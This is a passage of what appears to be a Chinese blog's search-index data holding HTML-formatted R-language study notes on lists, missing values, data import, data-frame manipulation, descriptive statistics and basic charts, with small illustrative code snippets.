factor(status,order=TRUE,levels=c(&quot;Poor&quot;,&quot;Improved&quot;,&quot;Excellent&quot;))</span><br></pre></td></tr></table></figure>\n<strong>如果用字符向量创建数据框，R会将字符向量转换为因子，可以手动取消：最后一个参数设置为：stringAsFactors=FALSE</strong></li>\n</ul>\n<h3 id=\"列表-List\"><a href=\"#列表-List\" class=\"headerlink\" title=\"列表(List)\"></a>列表(List)</h3><p>列表就是一些对象的有序集合。列表中可<br>能是若干向量、矩阵、数据框,甚至其他<br>列表的组合。例:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">g &lt;- &quot;My First List&quot;</span><br><span class=\"line\">h &lt;- c(25, 26, 18, 39)</span><br><span class=\"line\">j &lt;- matrix(1:10, nrow=5)</span><br><span class=\"line\">k &lt;- c(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;)</span><br><span class=\"line\">mylist &lt;- list(title=g, ages=h,j, k)</span><br><span class=\"line\">mylist</span><br></pre></td></tr></table></figure><br>列表是一个有下标的多类型的广义容器</p>\n<h4 id=\"关于NA\"><a href=\"#关于NA\" class=\"headerlink\" title=\"关于NA\"></a>关于NA</h4><p>NA(Not Available),NaN(Not a Number),分别表示缺失值和不可能存在的值（例如除0的结果）。<br>将一个值赋给某个向量、矩阵、数组或列表中一个不存在的元素时,R将自动扩展这个数据结构以容纳新值,空缺的部分由<code>NA</code>填补;当访问一个容器不存在的位置的元素时，也会返回<code>NA</code>。</p>\n<ul>\n<li>函数<code>is.na()</code>用以检测缺失值是否存在。<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">y &lt;- c(1, 2, 3, NA)</span><br><span class=\"line\">#then the function</span><br><span class=\"line\">is.na(y)</span><br><span class=\"line\">#returns c(FALSE, FALSE, FALSE, TRUE)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>缺失值参与函数计算和四则运算结果依然是缺失值，多数的数值函数都有一个<code>na.rm=TRUE</code>选项</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">x &lt;- c(1, 2, NA, 3)</span><br><span class=\"line\">y &lt;- sum(x, na.rm=TRUE)</span><br></pre></td></tr></table></figure>\n<p><code>na.omit()</code>可以删除所有含缺失数据的行:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- na.omit(olddataframe)</span><br></pre></td></tr></table></figure></p>\n<p><strong>注意：R中容器下标从1开始</strong></p>\n<h2 id=\"数据的导入\"><a href=\"#数据的导入\" class=\"headerlink\" title=\"数据的导入\"></a>数据的导入</h2><h4 id=\"edit-键盘输入\"><a href=\"#edit-键盘输入\" class=\"headerlink\" title=\"edit()键盘输入\"></a>edit()键盘输入</h4><p><code>edit()</code>会调用一个允许手动输入数据的文本编辑器<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">patientdata &lt;- edit(patientdata)</span><br></pre></td></tr></table></figure><br><code>edit()</code>是基于对象的一个副本进行修改的，返回徐改后的副本</p>\n<h4 id=\"从带分隔符的文本-csv-导入数据\"><a href=\"#从带分隔符的文本-csv-导入数据\" class=\"headerlink\" title=\"从带分隔符的文本(*.csv)导入数据\"></a>从带分隔符的文本(*.csv)导入数据</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mydataframe &lt;- read.table(file,header=logical_value,sep=&quot;delimiter&quot;,row.names=&quot;name&quot;)</span><br></pre></td></tr></table></figure>\n<p><code>read.table()</code>从带分隔符的文本文件中导入数据，<code>header</code>表明首行是否包含了变量名，<code>sep</code>指定分隔符，<code>row.names</code>是一个可选参数，用以指定一个或多个标识符。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights &lt;- read.table(&quot;flights14.csv&quot;, header=TRUE, sep=&quot;,&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>默认情况下,字符型变量将转换为因子</strong></p>\n<h4 id=\"从Excel中导入\"><a href=\"#从Excel中导入\" class=\"headerlink\" title=\"从Excel中导入\"></a>从Excel中导入</h4><p>读取一个Excel文件的最好方式,就是在<br>Excel中将其导出为一个逗号分隔文件<br>(csv),再使用上一页的方式导入R中。</p>\n<h4 id=\"导入XML数据\"><a href=\"#导入XML数据\" class=\"headerlink\" title=\"导入XML数据\"></a>导入XML数据</h4><p>R的XML包:<br>– 可用来解析处理XML或是HTML数据<br>– 还可以抓取网页数据<br>– 最重要两个函数是xmlTreeParse()和getNodeSet(),前者负责抓取页面数据并形成树状结构,后者对抓取的数据根据XPath语法来选取特定的节点集合。</p>\n<h4 id=\"导入SPSS数据\"><a href=\"#导入SPSS数据\" class=\"headerlink\" title=\"导入SPSS数据\"></a>导入SPSS数据</h4><p>SPSS数据集可以通过foreign包中的函数<code>read.spss()</code>导入到R中,也可以使用<code>Hmisc</code><br>包中的<code>spss.get()</code>函数。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;Hmisc&quot;)</span><br><span class=\"line\">library(Hmisc)</span><br><span class=\"line\">mydataframe &lt;- spss.get(&quot;mydata.sav&quot;,</span><br><span class=\"line\">use.value.labels=TRUE)</span><br></pre></td></tr></table></figure><br>mydata.sav是要导入的SPSS数据文件,<code>use.value.labels=TRUE</code>表示让函数将带有值标签的变量导入为R中水平对应相同的因子,<code>mydataframe</code>是导入后的R数据框。</p>\n<h4 id=\"导入SAS数据\"><a href=\"#导入SAS数据\" class=\"headerlink\" title=\"导入SAS数据\"></a>导入SAS数据</h4><p>SAS的版本更新可能会导致R中导入SAS数据集的函数失效。可以采用以下方法:</p>\n<ol>\n<li>以在SAS中使用PROC EXPORT将SAS数据<br>集保存为一个逗号分隔的文本文件</li>\n<li>再使用处理csv的方法</li>\n</ol>\n<h4 id=\"访问数据库管理系统\"><a href=\"#访问数据库管理系统\" class=\"headerlink\" title=\"访问数据库管理系统\"></a>访问数据库管理系统</h4><p>例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library(RODBC) #使用微软ODBC接口</span><br><span class=\"line\">myconn &lt;-odbcConnect(&quot;mydsn&quot;, uid=&quot;Rob&quot;,pwd=&quot;aardvark&quot;)</span><br><span class=\"line\">crimedat &lt;- sqlFetch(myconn, Crime)</span><br><span class=\"line\">#sqlFetch()将Crime表复制到R数据框crimedat中</span><br><span class=\"line\">pundat &lt;- sqlQuery(myconn, &quot;select * from Punishment&quot;) </span><br><span class=\"line\">#sqlQuery()非常强大,因为其中可以插入任意的有效SQL语句</span><br><span class=\"line\">close(myconn)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"数据处理\"><a href=\"#数据处理\" class=\"headerlink\" title=\"数据处理\"></a>数据处理</h2><h3 id=\"变量与运算符\"><a href=\"#变量与运算符\" class=\"headerlink\" title=\"变量与运算符\"></a>变量与运算符</h3><p>R是弱类型语言，类似python，动态类型变量，使用<code>&lt;-</code>赋值，对于数据框，添加新属性和json操作类似，直接给某个属性赋值</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>+</code></td>\n<td>加</td>\n</tr>\n<tr>\n<td><code>-</code></td>\n<td>减</td>\n</tr>\n<tr>\n<td><code>*</code></td>\n<td>乘</td>\n</tr>\n<tr>\n<td><code>\\</code></td>\n<td>除</td>\n</tr>\n<tr>\n<td><code>^或**</code></td>\n<td>求幂</td>\n</tr>\n<tr>\n<td><code>x%%y</code></td>\n<td>取余</td>\n</tr>\n<tr>\n<td><code>x%/%y</code></td>\n<td>整除</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"变量冲编码\"><a href=\"#变量冲编码\" class=\"headerlink\" title=\"变量冲编码\"></a>变量冲编码</h3><p>举例：一个调查问卷的数据框<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">manager &lt;- c(1, 2, 3, 4, 5)</span><br><span class=\"line\">date &lt;- c(&quot;10/24/08&quot;, &quot;10/28/08&quot;, &quot;10/1/08&quot;, &quot;10/12/08&quot;, &quot;5/1/09&quot;)</span><br><span class=\"line\">country &lt;- c(&quot;US&quot;, &quot;US&quot;, &quot;UK&quot;, &quot;UK&quot;, &quot;UK&quot;)</span><br><span class=\"line\">gender &lt;- c(&quot;M&quot;, &quot;F&quot;, &quot;F&quot;, &quot;M&quot;, &quot;F&quot;)</span><br><span class=\"line\">age &lt;- c(32, 45, 25, 39, 99) #99代表年龄缺失</span><br><span class=\"line\">q1 &lt;- c(5, 3, 3, 3, 2)</span><br><span class=\"line\">q2 &lt;- c(4, 5, 5, 3, 2)</span><br><span class=\"line\">q3 &lt;- c(5, 2, 5, 4, 1)</span><br><span class=\"line\">q4 &lt;- c(5, 5, 5, NA, 2)</span><br><span class=\"line\">q5 &lt;- c(5, 5, 2, NA, 1)</span><br><span class=\"line\">leadership &lt;- data.frame(manager, date, country, gender, age, q1, q2,</span><br><span class=\"line\">q3, q4, q5, stringsAsFactors=FALSE)</span><br></pre></td></tr></table></figure><br>变量冲编码是指修改容器中的数据，例如：<br><code>leadership$agecat[leader$age&gt;75] &lt;- &quot;Elder&quot;</code>表示将leadership中age&gt;75查询对应的agecat赋值为”Elder”，R中的<code>[]</code>用途类似定于表示限定，类似sql的where语句。</p>\n<p>使用<code>within()</code>可以简化语法，对于leadership 数据框修改：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">leadership &lt;- within(leadership,&#123;</span><br><span class=\"line\">agecat &lt;- NA</span><br><span class=\"line\">agecat[age &gt; 75] &lt;- &quot;Elder&quot;</span><br><span class=\"line\">agecat[age &gt;= 55 &amp; age &lt;= 75] &lt;- &quot;Middle Aged&quot;</span><br><span class=\"line\">agecat[age &lt; 55] &lt;- &quot;Young&quot; &#125;)</span><br></pre></td></tr></table></figure><br><strong>注意within()也是基于副本操作，所以需要使用赋值语句来保存变化值，某一个成员都被赋成NA则该属性被视作删除</strong></p>\n<h3 id=\"变量重命名\"><a href=\"#变量重命名\" class=\"headerlink\" title=\"变量重命名\"></a>变量重命名</h3><p><code>fix()</code>可以调用一个交互式的编辑器,单击变量名,然后在弹出的对话框中将其重命名。例如:<code>fix(leadership)</code></p>\n<p>只用edit(X)在窗口中编辑修改X,关闭窗口后X没有改变,应使用 <code>Y&lt;- edit(X)</code>;使用<code>fix(X)</code>在窗口中编辑修改X,关闭窗口后X就是修改后的值,不必使用<code>Y &lt;- fix(X)</code>。</p>\n<p>也可使用<code>reshape</code>报提供的<code>rename()</code>函数:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;reshape&quot;) #先安装包</span><br><span class=\"line\">library(reshape)</span><br><span class=\"line\">leadership &lt;- rename(leadership,</span><br><span class=\"line\">c(manager=&quot;managerID&quot;, date=&quot;testDate&quot;)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>方法三则是使用<code>names()</code>函数，该函数返回一个向量，包含了数据框的所有元素名称，对他操作则视作对数据框内元素名称的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#查看所有变量名</span><br><span class=\"line\">names(leadership)</span><br><span class=\"line\">#将第二个变量重命名</span><br><span class=\"line\">names(leadership)[2] &lt;- &quot;testDate&quot;</span><br><span class=\"line\">#将q1到q5重命名为item1到item5</span><br><span class=\"line\">names(leadership)[6:10] &lt;- c(&quot;item1&quot;,&quot;item2&quot;, &quot;item3&quot;, &quot;item4&quot;, &quot;item5&quot;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"日期值\"><a href=\"#日期值\" class=\"headerlink\" title=\"日期值\"></a>日期值</h3><p><code>as.Date(x,&quot;input_format&quot;)</code>函数用于将字符串类型转化为日期类型，x是时间字符串，input_format是时间格式字符串（具体查阅ppt-3.23）</p>\n<p>日期值的默认输入格式为<code>yyyy-mm-dd</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mydates &lt;- as.Date(c(&quot;2007-06-22&quot;, &quot;2004-02-13&quot;))</span><br></pre></td></tr></table></figure>\n<p>在leadership数据集中,日期是以<br><code>mm/dd/yy</code>的格式编码为字符型变量的。需要转化:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">leadership$date &lt;- as.Date(leadership$date,&quot;%m/%d/%y&quot;)</span><br></pre></td></tr></table></figure></p>\n<p><code>Sys.Date()</code>可以返回当天日期，<code>date()</code>可以返回当前日期和时间，<code>format(x,format=&quot;output_format&quot;)</code>和<code>as.Date()</code>类似，后者基于副本操作返回新值，前者直接修改变量。</p>\n<p>Date类型支持加减法，<code>difftime(date1, date2, units=&quot;weeks&quot;)</code>用于计算周数，<code>as.character(dates)</code>返回一个字符串，用于把日期转化为字符串。</p>\n<h3 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h3><p>判断是数据类型：R提供了形如is.DataType()的函数，例如<code>is.numeric()</code>,<code>is.character()</code>,<code>is.vector()</code>,<code>is.matrix</code>,<code>is.data.frame()</code>,他们返回True或者False.</p>\n<p>数据类型转化：R提供类似as.DataType()的函数，例如<code>as.numeric()</code>,<code>as.character()</code>,<code>as.vector()</code>,<code>as.matrix</code>,<code>as.data.frame()</code>他们转化原类型，返回新类型。</p>\n<h3 id=\"数据排序\"><a href=\"#数据排序\" class=\"headerlink\" title=\"数据排序\"></a>数据排序</h3><p>使用<code>order()</code>函数对一个数据框进行排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership[order(leadership$age),]</span><br></pre></td></tr></table></figure>\n<p>在排序变量的前边加一个减号即可得到降<br>序的排序结果。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership[order(-leadership$age),]</span><br></pre></td></tr></table></figure><br>多变量排序：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership[order(leadership$gender,leadership$age),]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据集的合并\"><a href=\"#数据集的合并\" class=\"headerlink\" title=\"数据集的合并\"></a>数据集的合并</h3><p>数据集的合并用于增加变量或者增加观测</p>\n<ul>\n<li><p>横向合并：使用<code>merge()</code>函数，如果有一个或多个共同变量，则进行内联。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">total &lt;- merge(dataframe1,dataframe2,by=&quot;ID&quot;)</span><br><span class=\"line\">total &lt;- merge(dataframe1,dataframe2,by=c(&quot;ID&quot;,&quot;Country&quot;))</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>横向合并：如果不需要指定一个公共索引，则可以直接使用<code>cbind()</code>函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">total &lt;- cbind(dataframe1,dataframe2)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>纵向合并：<code>rbind()</code>函数，两个数据框必须有相同的变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">total &lt;- rbind(dataframeA,dataframeB)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"数据集的子集\"><a href=\"#数据集的子集\" class=\"headerlink\" title=\"数据集的子集\"></a>数据集的子集</h3><p>可以通过下标选取数据的方式获得子集：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership[, c(6:10)]</span><br></pre></td></tr></table></figure></p>\n<p>剔除数据：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">myvars &lt;- names(leadership) %in% c(&quot;q3&quot;, &quot;q4&quot;)</span><br><span class=\"line\">newdata&lt;-leadership[!myvars]</span><br></pre></td></tr></table></figure><br>其中myvars是一个只包含布尔类型的变量的向量，传入<code>[]</code>中，返回对应为True的子数据框。</p>\n<p>选取变量时采用逻辑型向量注意:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">leadership[c(TRUE, FALSE, FALSE),]</span><br><span class=\"line\"># 如果行数大于3:会得到1、4、7、10、1316......行</span><br><span class=\"line\">leadership[c(TRUE, FALSE),]</span><br><span class=\"line\"># 如果行数大于2:会得到1、3、5、7......行</span><br></pre></td></tr></table></figure></p>\n<p>例如：删除第七和第八个变量<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership(c(-7,-8))</span><br></pre></td></tr></table></figure></p>\n<p>也可以这样删除：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">leadership$q3 &lt;- NULL</span><br></pre></td></tr></table></figure></p>\n<p><code>[]</code>表示限定，用于选入观测：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- leadership[leadership$gender==&quot;M&quot;</span><br><span class=\"line\">&amp;leadership$age &gt; 30,]</span><br></pre></td></tr></table></figure></p>\n<p><code>subset()</code>函数使用来选择变量和观测的最简单方法:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newdata &lt;- subset(leadership, age &gt;= 35 | age &lt; 24, select=c(q1, q2, q3, q4))</span><br><span class=\"line\">newdata &lt;- subset(leadership, gender==&quot;M&quot; &amp; age &gt; 25, select=gender:q4)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"随机抽样\"><a href=\"#随机抽样\" class=\"headerlink\" title=\"随机抽样\"></a>随机抽样</h3><p><code>sample()</code>可以从数据集中（有放回或无放回地）抽取大小为n的一个随机样本<br>例：从leadership数据集中随机抽取一个大小为3的样本<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysample &lt;- leadership[sample(1:nrow(leadership),3,replace=FALSE)]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"SQL语句操作数据框\"><a href=\"#SQL语句操作数据框\" class=\"headerlink\" title=\"SQL语句操作数据框\"></a>SQL语句操作数据框</h3><p>安装sqldf数据包，<code>install.packages(&quot;sqldf&quot;)</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library(sqldf)</span><br><span class=\"line\">newdf &lt;- sqldf(&quot;select * from .....&quot;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据框的转置\"><a href=\"#数据框的转置\" class=\"headerlink\" title=\"数据框的转置\"></a>数据框的转置</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cars &lt;- mtcars[1:5,1:4]</span><br><span class=\"line\">t(car) #对car转置</span><br></pre></td></tr></table></figure>\n<h3 id=\"分类汇总\"><a href=\"#分类汇总\" class=\"headerlink\" title=\"分类汇总\"></a>分类汇总</h3><p>分类汇总的函数为<code>aggregate(x, by, FUN)</code>，其中x是待分类汇总的数据对象;by是一个<br>变量名组成的列表,用于对原有观测进行分类;FUN是用来计算描述性统计量的函数,它将被用来计算新观测中的值。例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">options(digits=3) #保留3位有效数字</span><br><span class=\"line\">attach(mtcars)</span><br><span class=\"line\">aggdata &lt;-aggregate(mtcars, by=list(cyl,gear),FUN=mean, na.rm=TRUE)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Reshape包\"><a href=\"#Reshape包\" class=\"headerlink\" title=\"Reshape包\"></a>Reshape包</h3><p>reshape包是一套整合和重构数据集的万能工具。首先将数据melt，使每一行都是一个唯一的标识符—变量组合，然后将数据cast为任何形状，在重铸过程中，可以使用任何函数对数据进行整合。</p>\n<p>首先<code>library(reshape2)</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">md &lt;- melt(mydata,id=c(&quot;ID&quot;,&quot;Time&quot;)) #融化数据</span><br></pre></td></tr></table></figure>\n<p>之后<code>newdata &lt;- cast(md,formula,FUN)</code>，md是已经融化的数据，formula是想要的最后结果，FUN是可选的函数</p>\n<p>例子：根据id求x1平均值<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cast(md,id~x1,mean)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"条件与循环\"><a href=\"#条件与循环\" class=\"headerlink\" title=\"条件与循环\"></a>条件与循环</h3><p>类似c语言的if else语法，注意else的匹配，<code>&#125; else &#123;</code>需要出现在同一行。<br>R中特有函数<code>if(cond,statement1,statement2)</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">switch(i,</span><br><span class=\"line\">happy = &quot;I am glad you are happy&quot;,</span><br><span class=\"line\">afraid = &quot;There is nothing to fear&quot;,</span><br><span class=\"line\">sad = &quot;Cheer up&quot;,</span><br><span class=\"line\">angry = &quot;Calm down now&quot;</span><br><span class=\"line\">) # 返回一个最终的结果</span><br></pre></td></tr></table></figure>\n<p>循环：<code>for(variable in seq) statement</code>, <code>while(cond) statement</code></p>\n<h3 id=\"自定义函数\"><a href=\"#自定义函数\" class=\"headerlink\" title=\"自定义函数\"></a>自定义函数</h3><p>例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mydate &lt;- function(type=&quot;long&quot;) &#123; # 默认参数</span><br><span class=\"line\">  switch(type,</span><br><span class=\"line\">  long = format(Sys.time(), &quot;%A %B %d %Y&quot;),</span><br><span class=\"line\">  short = format(Sys.time(), &quot;%m-%d-%y&quot;),</span><br><span class=\"line\">  cat(type, &quot;is not a recognized type\\n&quot;))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","categories":["R语言学习"],"tags":["R语言"]},{"title":"R语言学习（三）基本统计分析","url":"/2018/10/07/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89%E5%9F%BA%E6%9C%AC%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90/","content":"<h2 id=\"描述性统计分析\"><a href=\"#描述性统计分析\" class=\"headerlink\" title=\"描述性统计分析\"></a>描述性统计分析</h2><h3 id=\"统计函数：\"><a href=\"#统计函数：\" class=\"headerlink\" title=\"统计函数：\"></a>统计函数：</h3><p>对于向量类型x:<br>| 统计量 | 函数 |<br>| ——- | ——- |<br>| 平均数 | <code>mean(x)</code> |<br>| 中位数 | <code>median(x)</code> |<br>| 方差 | <code>var(x)</code> |<br>| 标准差 | <code>sd(x)</code> |<br>| 值域 | <code>range(x)</code> |<br>| 求和 | <code>sum(x)</code> |<br>| 求最小值 | <code>min(x)</code> |<br>| 求最大值 | <code>max(x)</code> |</p>\n<span id=\"more\"></span>\n<h3 id=\"summary-函数\"><a href=\"#summary-函数\" class=\"headerlink\" title=\"summary()函数\"></a>summary()函数</h3><p><code>summary()</code>函数提供了最小值、最大值、四分位数和数值型变量的均值,以及因子向量和逻辑型向量的频数统计。</p>\n<h3 id=\"sapply-函数\"><a href=\"#sapply-函数\" class=\"headerlink\" title=\"sapply()函数\"></a>sapply()函数</h3><p><code>sapply()</code>函数，使用格式为<code>sapply(x,FUN,options)</code>，x是数据框，FUN是任意函数，<code>sapply()</code>对对数据框的每一列应用FUN函数，option会被指定给FUN</p>\n<h3 id=\"aggregate-函数\"><a href=\"#aggregate-函数\" class=\"headerlink\" title=\"aggregate()函数\"></a>aggregate()函数</h3><p>分组计算描述性统计量：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">aggregate(mtcars[myvars], by=list(am=mtcars$am), sd)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"by-函数\"><a href=\"#by-函数\" class=\"headerlink\" title=\"by()函数\"></a>by()函数</h3><p><code>aggregate()</code>仅允许在每次调用中使用平均数、标准差这样的单返回值函数。它无法一次返回若干个统计量。要完成这项任务.可以使用<code>by()</code>函数。格式为:<br><code>by(data,INDICES,FUN)</code>,其中data是一个数据框或矩阵,INDICES是一个因子或因子组成的列表,定义了分组,FUN是任意函数:单返回值函数和多返回值函数均可。</p>\n<h2 id=\"频数表-列联表\"><a href=\"#频数表-列联表\" class=\"headerlink\" title=\"频数表(列联表)\"></a>频数表(列联表)</h2><ul>\n<li><p><strong>频数表</strong>是将数据集按照某个特定列分类(分组)时观察每个类/组中数据出现次数的表。</p>\n</li>\n<li><p><strong>列联表</strong>(contingency tables)也是频数表,只不过它会分析的是将数据集按两个或两个以上类别变量联合分组时观察数据在每个分组中出现频数的表。</p>\n</li>\n</ul>\n<h2 id=\"独立性检验\"><a href=\"#独立性检验\" class=\"headerlink\" title=\"独立性检验\"></a>独立性检验</h2><h2 id=\"相关性检验\"><a href=\"#相关性检验\" class=\"headerlink\" title=\"相关性检验\"></a>相关性检验</h2><h2 id=\"t检验\"><a href=\"#t检验\" class=\"headerlink\" title=\"t检验\"></a>t检验</h2><h2 id=\"方差分析\"><a href=\"#方差分析\" class=\"headerlink\" title=\"方差分析\"></a>方差分析</h2><h2 id=\"组间差异的非参数检验\"><a href=\"#组间差异的非参数检验\" class=\"headerlink\" title=\"组间差异的非参数检验\"></a>组间差异的非参数检验</h2>","categories":["R语言学习"],"tags":["R语言"]},{"title":"R语言学习（二）数据可视化","url":"/2018/10/07/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/","content":"<h2 id=\"数据可视化\"><a href=\"#数据可视化\" class=\"headerlink\" title=\"数据可视化\"></a>数据可视化</h2><h3 id=\"条形图-Bar-plots\"><a href=\"#条形图-Bar-plots\" class=\"headerlink\" title=\"条形图(Bar plots)\"></a>条形图(Bar plots)</h3><p>基本条形图：<code>barplot(height)</code>，其中height是一个向量或者矩阵<br>例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># vertical barplot</span><br><span class=\"line\">barplot(counts,main=&quot;Simple Bar Plot&quot;,xlab=&quot;Improvement&quot;,ylab=&quot;Frequency&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"># horizontal bar plot</span><br><span class=\"line\">barplot(counts,main=&quot;Horizontal Bar Plot&quot;,xlab=&quot;Frequency&quot;, ylab=&quot;Improvement&quot;,horiz=TRUE)</span><br></pre></td></tr></table></figure><br>main是条形图标题，xlab和ylab是横总坐标的标签，最后一个可选参数表示是否为纵条形图</p>\n<span id=\"more\"></span>\n<p>堆砌条形图：<br><strong>ppt4.8</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library(vcd)</span><br><span class=\"line\">counts &lt;- table(Arthritis$Improved, Arthritis$Treatment)</span><br><span class=\"line\"></span><br><span class=\"line\"># stacked barplot</span><br><span class=\"line\">barplot(counts,main=&quot;Stacked Bar Plot&quot;,xlab=&quot;Treatment&quot;, ylab=&quot;Frequency&quot;,col=c(&quot;red&quot;, &quot;yellow&quot;,&quot;green&quot;),</span><br><span class=\"line\">legend=rownames(counts))</span><br><span class=\"line\"></span><br><span class=\"line\"># grouped barplot</span><br><span class=\"line\">barplot(counts,main=&quot;Grouped Bar Plot&quot;,xlab=&quot;Treatment&quot;, ylab=&quot;Frequency&quot;,col=c(&quot;red&quot;, &quot;yellow&quot;, &quot;green&quot;),</span><br><span class=\"line\">legend=rownames(counts), beside=TRUE)</span><br></pre></td></tr></table></figure></p>\n<p>均值条形图：例,美国各地区平均文盲率排序的条形图:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">states &lt;- data.frame(state.region, state.x77)#R自带数据</span><br><span class=\"line\">means &lt;- aggregate(states$Illiteracy,by=list(state.region), FUN=mean) #求均值 (见第三章)</span><br><span class=\"line\"></span><br><span class=\"line\">means &lt;- means[order(means$x),] #排序</span><br><span class=\"line\">barplot(means$x, names.arg=means$Group.1)</span><br><span class=\"line\">title(&quot;Mean Illiteracy Rate&quot;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"饼图-Pie-charts\"><a href=\"#饼图-Pie-charts\" class=\"headerlink\" title=\"饼图(Pie charts)\"></a>饼图(Pie charts)</h3><p><code>pie(x,label)</code><br>例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">slices &lt;- c(10, 12, 4, 16, 8)</span><br><span class=\"line\">lbls &lt;- c(&quot;US&quot;, &quot;UK&quot;, &quot;Australia&quot;, &quot;Germany&quot;,&quot;France&quot;)</span><br><span class=\"line\">pie(slices, labels = lbls, main=&quot;Simple Pie Chart&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>3D饼图：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;plotrix&quot;)</span><br><span class=\"line\">library(plotrix)</span><br><span class=\"line\"></span><br><span class=\"line\">pie3D(slices,label=lbls,explode=0.1,main=&quot;3D Pie Chart&quot;)</span><br></pre></td></tr></table></figure><br>其中explode是快之间的距离</p>\n<h3 id=\"扇形图-Fan-plot\"><a href=\"#扇形图-Fan-plot\" class=\"headerlink\" title=\"扇形图(Fan plot)\"></a>扇形图(Fan plot)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;plotrix&quot;)</span><br><span class=\"line\">library(plotrix)</span><br><span class=\"line\"></span><br><span class=\"line\">fan.plot(slices,label=lbls,main=&quot;&quot;Fan 